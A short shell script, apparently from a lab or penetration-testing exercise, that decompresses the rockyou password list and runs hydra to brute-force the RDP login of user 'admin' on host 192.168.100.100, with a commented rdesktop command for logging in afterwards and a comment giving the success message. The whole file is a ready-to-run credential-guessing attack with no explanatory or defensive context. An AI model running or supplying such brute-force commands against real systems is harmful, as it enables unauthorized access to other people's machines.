#/bin/bash
gzip -d /usr/share/wordlists/rockyou.txt.gz
hydra -l admin -P /usr/share/wordlists/rockyou.txt -v -V -f rdp://192.168.100.100
# rdesktop 192.168.100.100 -u admin -p password

# success = "1 valid password found"
